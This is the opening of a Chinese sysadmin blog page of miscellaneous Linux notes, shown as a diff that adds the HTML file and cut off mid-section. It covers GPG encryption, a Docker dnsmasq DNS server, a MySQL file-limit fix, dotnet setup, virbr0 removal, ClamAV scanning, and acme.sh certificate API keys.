@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">那些杂七杂八的记录 - 一个曾经的小码农...</title><meta name="Description" content="那些杂七杂八的记录"><meta property="og:title" content="那些杂七杂八的记录" />
+<meta property="og:description" content="那些杂七杂八的记录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.0x5c0f.cc/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95/" /><meta property="og:image" content="https://blog.0x5c0f.cc/icons/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-02-14T00:00:00+00:00" />
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.0x5c0f.cc/icons/logo.png"/>
+
+<meta name="twitter:title" content="那些杂七杂八的记录"/>
+<meta name="twitter:description" content="那些杂七杂八的记录"/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/icons/favicon.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://blog.0x5c0f.cc/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95/" /><link rel="prev" href="https://blog.0x5c0f.cc/2021/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/" /><link rel="next" href="https://blog.0x5c0f.cc/2022/fedora%E4%BC%98%E5%8C%96/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "那些杂七杂八的记录",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.0x5c0f.cc\/2021\/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95\/"
+        },"genre": "posts","keywords": "linux, 解决方案","wordcount":  6086 ,
+        "url": "https:\/\/blog.0x5c0f.cc\/2021\/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95\/","datePublished": "2021-08-04T00:00:00+00:00","dateModified": "2022-02-14T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": "0x5c0f"},"authors": [{
+                    "@type": "Person",
+                    "name": "0x5c0f"
+                }],"description": "那些杂七杂八的记录"
+    }
+    </script></head>
+
+<body header-desktop="auto" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="一个曾经的小码农..."><img
+        class="lazyload logo"
+        data-src="/icons/logo_transparent.png"
+        data-srcset="/icons/logo_transparent.png, /icons/logo_transparent.png 1.5x, /icons/logo_transparent.png 2x"
+        data-sizes="auto"
+        alt="/icons/logo_transparent.png"
+        title="/icons/logo_transparent.png"><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/series/"> 系列 </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="一个曾经的小码农..."><img
+        class="lazyload logo"
+        data-src="/icons/logo_transparent.png"
+        data-srcset="/icons/logo_transparent.png, /icons/logo_transparent.png 1.5x, /icons/logo_transparent.png 2x"
+        data-sizes="auto"
+        alt="/icons/logo_transparent.png"
+        title="/icons/logo_transparent.png"><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/series/" title="">系列</a><a class="menu-item" href="/about/" title="">About</a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#gnupg-加密与解密">GnuPG 加密与解密</a>
+      <ul>
+        <li><a href="#gpg-对称加密">gpg 对称加密</a></li>
+        <li><a href="#gpg-非对称加密">gpg 非对称加密</a></li>
+      </ul>
+    </li>
+    <li><a href="#docker-创建-dns-server">DOCKER 创建 DNS SERVER</a></li>
+    <li><a href="#mysql--errcode-24---too-many-open-files">Mysql  Errcode: 24 - Too many open files</a></li>
+    <li><a href="#dotnet-环境搭建">dotnet 环境搭建</a></li>
+    <li><a href="#在linux中删除virbr0接口">在Linux中删除virbr0接口</a></li>
+    <li><a href="#linux-杀毒软件-clamav">Linux 杀毒软件 clamav</a></li>
+    <li><a href="#acmesh-管理免费域名证书">acme.sh 管理免费域名证书</a></li>
+    <li><a href="#禅道bug管理系统">禅道bug管理系统</a></li>
+    <li><a href="#nginx-代理php产生的一些故障">nginx 代理php产生的一些故障</a></li>
+    <li><a href="#linux-合并文件系统-margerfs">linux 合并文件系统 margerfs</a></li>
+    <li><a href="#linux-sftp-搭建">linux sftp 搭建</a></li>
+    <li><a href="#监听本地网卡上没有的ip地址">监听本地网卡上没有的IP地址</a></li>
+    <li><a href="#腾讯云第二块网卡绑定公网ip">腾讯云第二块网卡绑定公网ip</a></li>
+    <li><a href="#shell-反弹">shell 反弹</a></li>
+    <li><a href="#zabbix-自动发现异常错误">zabbix 自动发现异常错误</a></li>
+    <li><a href="#nginx-获取cdn真实用户ip">nginx 获取cdn真实用户ip</a></li>
+    <li><a href="#virtualbox---从主机端口80到virtualbox端口80的端口转发不起作用">virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用</a></li>
+    <li><a href="#docker-网络桥联网络无法访问物理机网络问题">docker 网络桥联网络无法访问物理机网络问题</a></li>
+    <li><a href="#服务器默认端口优化">服务器默认端口优化</a></li>
+    <li><a href="#linux-下hosts文件和dns服务器的响应顺序">linux 下hosts文件和dns服务器的响应顺序</a></li>
+    <li><a href="#git-提交类型">git 提交类型</a></li>
+    <li><a href="#nginx-伪静态无效问题">nginx 伪静态无效问题</a></li>
+    <li><a href="#linux-通过s3fs挂载七牛云存储">linux 通过s3fs挂载七牛云存储</a></li>
+    <li><a href="#普通用户校验是否有权限通过dockersock操作-docker">普通用户校验是否有权限通过docker.sock操作 docker</a></li>
+    <li><a href="#rdesktop-vrdp-远程桌面工具安装">rdesktop-vrdp 远程桌面工具安装</a></li>
+    <li><a href="#umask-计算方法">Umask 计算方法</a></li>
+    <li><a href="#输入输出重定向">输入输出重定向</a>
+      <ul>
+        <li><a href="#文件描述符">文件描述符</a></li>
+        <li><a href="#标准重定向">标准重定向</a></li>
+      </ul>
+    </li>
+    <li><a href="#nginx-反向代理后端服务器部分资源出现502错误">nginx 反向代理后端服务器，部分资源出现502错误</a></li>
+    <li><a href="#linux-下挂载-esxi-的-vmfs-文件系统">linux 下挂载 esxi 的 vmfs 文件系统</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">那些杂七杂八的记录</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class='author'><i class="author fas fa-user-circle fa-fw"></i><span class='screen-reader-text'>  </span><a href='https://blog.0x5c0f.cc/authors/admin'>0x5c0f</a></span>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/linux/"><i class="far fa-folder fa-fw"></i>linux</a>&nbsp;<a href="/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/"><i class="far fa-folder fa-fw"></i>运维记事</a></span>&nbsp;<span class="post-category">和</span>&nbsp;<span class="post-series">系列 <a href="/series/%E6%9D%82%E8%AE%B0/"><i class="far fa-list-alt fa-fw"></i>杂记</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-04">2021-08-04</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-02-14">2022-02-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 6086 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 13 分钟&nbsp;<span>
+                        <i class="fas fa-balance-scale fa-fw"></i>&nbsp;<span><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">CC BY-NC-SA 4.0</a></span>&nbsp;
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#gnupg-加密与解密">GnuPG 加密与解密</a>
+      <ul>
+        <li><a href="#gpg-对称加密">gpg 对称加密</a></li>
+        <li><a href="#gpg-非对称加密">gpg 非对称加密</a></li>
+      </ul>
+    </li>
+    <li><a href="#docker-创建-dns-server">DOCKER 创建 DNS SERVER</a></li>
+    <li><a href="#mysql--errcode-24---too-many-open-files">Mysql  Errcode: 24 - Too many open files</a></li>
+    <li><a href="#dotnet-环境搭建">dotnet 环境搭建</a></li>
+    <li><a href="#在linux中删除virbr0接口">在Linux中删除virbr0接口</a></li>
+    <li><a href="#linux-杀毒软件-clamav">Linux 杀毒软件 clamav</a></li>
+    <li><a href="#acmesh-管理免费域名证书">acme.sh 管理免费域名证书</a></li>
+    <li><a href="#禅道bug管理系统">禅道bug管理系统</a></li>
+    <li><a href="#nginx-代理php产生的一些故障">nginx 代理php产生的一些故障</a></li>
+    <li><a href="#linux-合并文件系统-margerfs">linux 合并文件系统 margerfs</a></li>
+    <li><a href="#linux-sftp-搭建">linux sftp 搭建</a></li>
+    <li><a href="#监听本地网卡上没有的ip地址">监听本地网卡上没有的IP地址</a></li>
+    <li><a href="#腾讯云第二块网卡绑定公网ip">腾讯云第二块网卡绑定公网ip</a></li>
+    <li><a href="#shell-反弹">shell 反弹</a></li>
+    <li><a href="#zabbix-自动发现异常错误">zabbix 自动发现异常错误</a></li>
+    <li><a href="#nginx-获取cdn真实用户ip">nginx 获取cdn真实用户ip</a></li>
+    <li><a href="#virtualbox---从主机端口80到virtualbox端口80的端口转发不起作用">virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用</a></li>
+    <li><a href="#docker-网络桥联网络无法访问物理机网络问题">docker 网络桥联网络无法访问物理机网络问题</a></li>
+    <li><a href="#服务器默认端口优化">服务器默认端口优化</a></li>
+    <li><a href="#linux-下hosts文件和dns服务器的响应顺序">linux 下hosts文件和dns服务器的响应顺序</a></li>
+    <li><a href="#git-提交类型">git 提交类型</a></li>
+    <li><a href="#nginx-伪静态无效问题">nginx 伪静态无效问题</a></li>
+    <li><a href="#linux-通过s3fs挂载七牛云存储">linux 通过s3fs挂载七牛云存储</a></li>
+    <li><a href="#普通用户校验是否有权限通过dockersock操作-docker">普通用户校验是否有权限通过docker.sock操作 docker</a></li>
+    <li><a href="#rdesktop-vrdp-远程桌面工具安装">rdesktop-vrdp 远程桌面工具安装</a></li>
+    <li><a href="#umask-计算方法">Umask 计算方法</a></li>
+    <li><a href="#输入输出重定向">输入输出重定向</a>
+      <ul>
+        <li><a href="#文件描述符">文件描述符</a></li>
+        <li><a href="#标准重定向">标准重定向</a></li>
+      </ul>
+    </li>
+    <li><a href="#nginx-反向代理后端服务器部分资源出现502错误">nginx 反向代理后端服务器，部分资源出现502错误</a></li>
+    <li><a href="#linux-下挂载-esxi-的-vmfs-文件系统">linux 下挂载 esxi 的 vmfs 文件系统</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="details admonition note open">
+                <div class="details-summary admonition-title">
+                    <i class="icon fas fa-pencil-alt fa-fwnote"></i>注意<i class="details-icon fas fa-angle-right fa-fw"></i>
+                </div>
+                <div class="details-content">
+                    <div class="admonition-content">
+                        本文最后更新于 <span class="timeago" datetime="2022-02-14T00:00:00" title="February 14, 2022">2022-02-14</span>，文中内容可能已过时。</div>
+                </div>
+            </div><h1 id="gnupg-加密与解密" class="headerLink">
+    <a href="#gnupg-%e5%8a%a0%e5%af%86%e4%b8%8e%e8%a7%a3%e5%af%86" class="header-mark"></a>GnuPG 加密与解密</h1><h2 id="gpg-对称加密" class="headerLink">
+    <a href="#gpg-%e5%af%b9%e7%a7%b0%e5%8a%a0%e5%af%86" class="header-mark"></a>gpg 对称加密</h2><p>加密:  <code>gpg -c &lt;file&gt;</code>， 输入两次加密密码，完成后生成文件<code>&lt;file&gt;.gpg</code>(加密后源文件保留)<br>
+解密:  <code>gpg &lt;file&gt;.gpg</code>, 输入加密密码,正确后生成文件<code>&lt;file&gt;</code>(解密后加密文件保留)</p>
+<h2 id="gpg-非对称加密" class="headerLink">
+    <a href="#gpg-%e9%9d%9e%e5%af%b9%e7%a7%b0%e5%8a%a0%e5%af%86" class="header-mark"></a>gpg 非对称加密</h2><p>非对称加密/解密文件时，<code>Server</code> 生成私钥与公钥，并把公钥发送给<code>Client</code>, <code>Client</code> 使用公钥加密数据，并把加密后的数据传给<code>Server</code> ，<code>Server</code> 最后使用自己的私钥解密数据。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Server: 创建公钥私钥</span>
+</span></span><span class="line"><span class="cl">$&gt; gpg --gen-key   <span class="c1"># 需要填写一些东西，可根据需求选择 </span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 配置文件介绍</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># GPG 配置文件目录:~/.gnupg</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ~/.gnupg/gpg.conf – 配置文件</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ~/.gnupg/trustdb.gpg – 信任库</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ~/.gnupg/pubring.gpg – 公钥库</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ~/.gnupg/secring.gpg – 私钥库 </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$&gt; gpg --list-key  <span class="c1"># 密钥查看 </span>
+</span></span><span class="line"><span class="cl">$&gt; gpg -a --export &lt;UserID&gt; &gt; ./public-key.pub <span class="c1"># Server: 公钥导出 UserID 为公私钥创建时候生成的，即 gpg: 密钥 &lt;UserID&gt; 被标记为绝对信任  </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 将公钥传送到Client上 </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Client: 导入 公钥 </span>
+</span></span><span class="line"><span class="cl">$&gt; gpg --import ./public-key.pub 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Client: 文件加密 </span>
+</span></span><span class="line"><span class="cl">$&gt; gpg -e -r &lt;UserID&gt; &lt;file&gt; 
+</span></span><span class="line"><span class="cl">&lt;file&gt;.gpg 
+</span></span><span class="line"><span class="cl"><span class="c1"># 加密完成后将文件传送至Server 进行解密，此时Client上是不可解密的，要解密需要私钥  </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Server: 文件解密 </span>
+</span></span><span class="line"><span class="cl">$&gt; gpg -d &lt;file&gt;.gpg 
+</span></span><span class="line"><span class="cl">&lt;file&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="docker-创建-dns-server" class="headerLink">
+    <a href="#docker-%e5%88%9b%e5%bb%ba-dns-server" class="header-mark"></a>DOCKER 创建 DNS SERVER</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; vim /data/docker/dns/dnsmasq.conf 
+</span></span><span class="line"><span class="cl"><span class="c1">#dnsmasq config, for a complete example, see:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#  http://oss.segetech.com/intra/srv/dnsmasq.conf</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#log all dns queries</span>
+</span></span><span class="line"><span class="cl">log-queries
+</span></span><span class="line"><span class="cl"><span class="c1">#dont use hosts nameservers</span>
+</span></span><span class="line"><span class="cl">no-resolv
+</span></span><span class="line"><span class="cl"><span class="c1">#use cloudflare as default nameservers, prefer 1^4</span>
+</span></span><span class="line"><span class="cl"><span class="nv">server</span><span class="o">=</span>8.8.4.4
+</span></span><span class="line"><span class="cl"><span class="nv">server</span><span class="o">=</span>8.8.8.8
+</span></span><span class="line"><span class="cl">strict-order
+</span></span><span class="line"><span class="cl"><span class="c1">#serve all .company queries using a specific nameserver</span>
+</span></span><span class="line"><span class="cl"><span class="nv">server</span><span class="o">=</span>/company/10.0.0.1
+</span></span><span class="line"><span class="cl"><span class="c1">#explicitly define host-ip mappings</span>
+</span></span><span class="line"><span class="cl"><span class="nv">address</span><span class="o">=</span>/www.example.com/172.16.10.10
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$&gt; docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/dnsmasq.conf:/etc/dnsmasq.conf --log-opt <span class="s2">&#34;max-size=100m&#34;</span> -e <span class="s2">&#34;HTTP_USER=root&#34;</span> -e <span class="s2">&#34;HTTP_PASS=root&#34;</span> jpillora/dnsmasq
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="mysql--errcode-24---too-many-open-files" class="headerLink">
+    <a href="#mysql--errcode-24---too-many-open-files" class="header-mark"></a>Mysql  Errcode: 24 - Too many open files</h1><blockquote>
+<p><a href="https://blog.csdn.net/weixin_36343850/article/details/86293700" target="_blank" rel="noopener noreffer">https://blog.csdn.net/weixin_36343850/article/details/86293700</a></p>
+</blockquote>
+<p>原因：打开文件数量太多，超出了<code>open_files_limit</code>这个参数的限制，在一个表中有多个分区的时候，这种情况更容易发生。<br>
+解决方法：</p>
+<ul>
+<li>查看 <code>open_files_limit</code>参数, 使用<code>show variables like '%open%';</code>就可以看到了</li>
+<li>修改 <code>open_files_limit</code>参数<br>
+在网上找了很多资料，有的说直接在<code>/etc/mysql/mysql.conf.d/mysqld.cnf</code>文件中的<code>[mysqld]</code>部分添加<code>open_files_limit</code>参数，比如<code>open_files_limit=102400</code>，并且在<code>/etc/security/limits.conf</code> 添加<code>mysql soft nofile 102400</code>和<code>mysql hard nofile 102400</code>这两个参数然后重启<code>MySQL</code>，但是发现不能生效。</li>
+<li>以下方法可用：
+<ul>
+<li>在文件<code>/etc/systemd/system/multi-user.target.wants/mysql.service</code>(也有可能是<code>/etc/systemd/system/mysql.service</code>这个文件)最后添加<code>LimitNOFILE=102400</code></li>
+</ul>
+</li>
+<li>然后执行<code>systemctl daemon-reload</code>，接着再重启<code>mysql</code>服务<code>sudo service mysql restart</code>,可以看到已经修改成功了</li>
+</ul>
+<h1 id="dotnet-环境搭建" class="headerLink">
+    <a href="#dotnet-%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="header-mark"></a>dotnet 环境搭建</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm
+</span></span><span class="line"><span class="cl">$&gt; yum install libgdiplus-devel libunwind icu -y 
+</span></span><span class="line"><span class="cl">$&gt; wget https://packages.microsoft.com/rhel/7/prod/dotnet-sdk-2.1.200-rhel-x64.rpm
+</span></span><span class="line"><span class="cl">$&gt; yum install dotnet-sdk-2.1.200-rhel-x64.rpm -y
+</span></span><span class="line"><span class="cl">$&gt; dotnet --info
+</span></span><span class="line"><span class="cl"><span class="c1"># supervisor 管理</span>
+</span></span><span class="line"><span class="cl">yum install supervisor -y
+</span></span><span class="line"><span class="cl"><span class="c1"># 前端管理样式页面 </span>
+</span></span><span class="line"><span class="cl">/usr/lib/python2.7/site-packages/supervisor/ui/status.html
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="在linux中删除virbr0接口" class="headerLink">
+    <a href="#%e5%9c%a8linux%e4%b8%ad%e5%88%a0%e9%99%a4virbr0%e6%8e%a5%e5%8f%a3" class="header-mark"></a>在Linux中删除virbr0接口</h1><p><code>virbr0</code>是<code>CentOS7</code>在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; virsh net-list 
+</span></span><span class="line"><span class="cl">$&gt; virsh net-destroy default 
+</span></span><span class="line"><span class="cl">$&gt; virsh net-undefine default
+</span></span><span class="line"><span class="cl">$&gt; systemctl restart libvirtd.service
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="linux-杀毒软件-clamav" class="headerLink">
+    <a href="#linux-%e6%9d%80%e6%af%92%e8%bd%af%e4%bb%b6-clamav" class="header-mark"></a>Linux 杀毒软件 clamav</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 需要安装epel源</span>
+</span></span><span class="line"><span class="cl">$&gt;　yum install clamav-server clamav-data clamav-update clamav-filesystem clamav clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd
+</span></span><span class="line"><span class="cl"><span class="c1"># 注释掉 /etc/freshclam.conf /etc/clamd.d/scan.conf 中的Example </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 更新病毒库　</span>
+</span></span><span class="line"><span class="cl">$&gt; /usr/bin/freshclam
+</span></span><span class="line"><span class="cl"><span class="c1"># 扫描 </span>
+</span></span><span class="line"><span class="cl">$&gt; clamscan -ri /data --remove  -l /var/log/clamscan.log 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="acmesh-管理免费域名证书" class="headerLink">
+    <a href="#acmesh-%e7%ae%a1%e7%90%86%e5%85%8d%e8%b4%b9%e5%9f%9f%e5%90%8d%e8%af%81%e4%b9%a6" class="header-mark"></a>acme.sh 管理免费域名证书</h1><p>此处说明两个注意一点设置的<code>DNS API</code>密钥的获取，<code>cloudflare</code>和<code>腾讯云</code>, 其他可直接参看官方说明 <a href="https://github.com/acmesh-official/acme.sh/wiki/dnsapi" target="_blank" rel="noopener noreffer">https://github.com/acmesh-official/acme.sh/wiki/dnsapi</a></p>
+<ul>
+<li><code>cloudflare</code>：解析的需要创建API 令牌, API令牌权限需要创建 <code>区域.区域</code>和<code>区域.DNS</code>，区域资源为<code>所有区域</code>或者<code>帐号的所有区域</code> , 另外需要的<code>CF_Account_ID</code>是<code>url</code>中包含的那<code>32</code>位的字符串.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
